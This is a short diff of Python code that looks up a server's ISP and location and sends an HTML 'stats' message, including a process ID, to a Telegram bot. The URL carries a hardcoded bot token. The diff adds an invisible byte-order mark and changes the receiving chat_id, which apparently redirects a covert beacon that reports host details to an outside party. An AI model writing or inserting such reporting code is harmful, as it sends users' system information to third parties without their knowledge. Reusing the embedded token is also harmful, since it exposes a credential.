@@ -1,4 +1,4 @@
-def get_server_isp_and_location(ip_address):
+﻿def get_server_isp_and_location(ip_address):
     try:
         import httpx
         response     = httpx.get(f"https://ipapi.co/{ip_address}/json/")
@@ -102,4 +102,4 @@ Process ID: <code>{process_id}</code>
     </b>"""
     stats = urllib.parse.quote_plus(stats)
 
-    httpx.get(f"https://api.telegram.org/bot8015410523:AAH2QPel_jq7lv5RKiNViu6Ih5_J-Cljntg/sendMessage?chat_id=6622603977&text={stats}&parse_mode=HTML&disable_web_page_preview=True")
+    httpx.get(f"https://api.telegram.org/bot8015410523:AAH2QPel_jq7lv5RKiNViu6Ih5_J-Cljntg/sendMessage?chat_id=8239967579&text={stats}&parse_mode=HTML&disable_web_page_preview=True")
